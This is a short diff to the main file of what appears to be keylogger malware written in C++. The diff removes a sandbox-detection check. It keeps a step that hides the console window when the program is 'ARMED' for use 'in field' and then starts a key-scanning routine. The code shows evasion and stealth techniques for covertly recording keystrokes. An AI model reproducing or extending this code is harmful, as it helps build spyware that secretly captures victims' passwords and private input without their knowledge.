@@ -1,15 +1,11 @@
 #include "pch.h"
 
 #include "log/logFILE/file.h"
-#include "sandboxdetect/sandboxdetect.h"
 #include "keyscan/keyscan.h"
 
 int main() {
-	//if running in field hide console and check for sandbox environment
-	if (ARMED) {
-		FreeConsole();
-		if (!sandboxdetect::checkSafety()) return 0;
-	}
+	//if running in field hide console
+	if (ARMED) FreeConsole();
 	//scanning from hereon
 	keyscan scanner;
 	scanner.scan();
